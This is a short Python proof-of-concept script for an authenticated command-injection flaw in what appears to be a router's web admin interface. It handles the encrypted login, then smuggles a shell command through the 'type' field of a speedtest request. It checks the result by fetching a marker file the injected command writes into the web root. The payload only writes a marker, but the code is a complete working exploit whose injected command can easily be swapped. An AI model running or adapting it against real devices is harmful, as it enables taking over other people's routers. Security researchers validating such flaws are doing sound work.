import argparse
import secrets
import time
from urllib.error import HTTPError
from urllib.request import urlopen

from poc_vlan_web import WebCrypto, post, rsa_encrypt_hex


def main():
    parser = argparse.ArgumentParser(description="Validate speedtest type command injection without external network traffic")
    parser.add_argument("base_url")
    parser.add_argument("--password", default="admin", help="Known password of the local test account")
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")

    keys = post(base_url, "login", "keys", "read", {})
    encrypted = rsa_encrypt_hex(args.password, *keys["result"]["password"])
    auth = post(base_url, "login", "auth", "read", {})
    crypto = WebCrypto(*auth["result"]["key"], auth["result"]["seq"])
    login, session = post(base_url, "login", "login", "login", {"username": "admin", "password": encrypted},
                          crypto=crypto, password=args.password, return_cookie=True)
    stok = login.get("result", {}).get("stok")
    if not stok:
        raise RuntimeError(f"Login did not return stok: {login}")

    marker = "speed_" + secrets.token_hex(6)
    payload = f"single;echo SPEED_OK>/www/{marker};exit 0;#"
    print(f"marker={marker}")
    try:
        urlopen(f"{base_url}/{marker}", timeout=10)
        raise RuntimeError("Marker already existed before the exploit")
    except HTTPError as error:
        if error.code != 404:
            raise
    try:
        post(base_url, f"{stok}/admin/device", "speedtest", "write",
             {"type": payload, "is_auto": True}, crypto=crypto, password=args.password,
             renew=False, cookie=session)
    except Exception as error:
        print(f"Speedtest request raised {type(error).__name__}; checking the marker")
    deadline = time.monotonic() + 20
    while True:
        try:
            with urlopen(f"{base_url}/{marker}", timeout=5) as response:
                result = response.read().decode(errors="replace").strip()
                print(f"GET {marker}: HTTP {response.status} body={result!r}")
                if result != "SPEED_OK":
                    raise RuntimeError("Marker content mismatch")
                print(f"VALIDATED: authenticated speedtest type command injection wrote /www/{marker}")
                return
        except HTTPError as error:
            if error.code != 404 or time.monotonic() >= deadline:
                raise
            time.sleep(0.2)


if __name__ == "__main__":
    main()
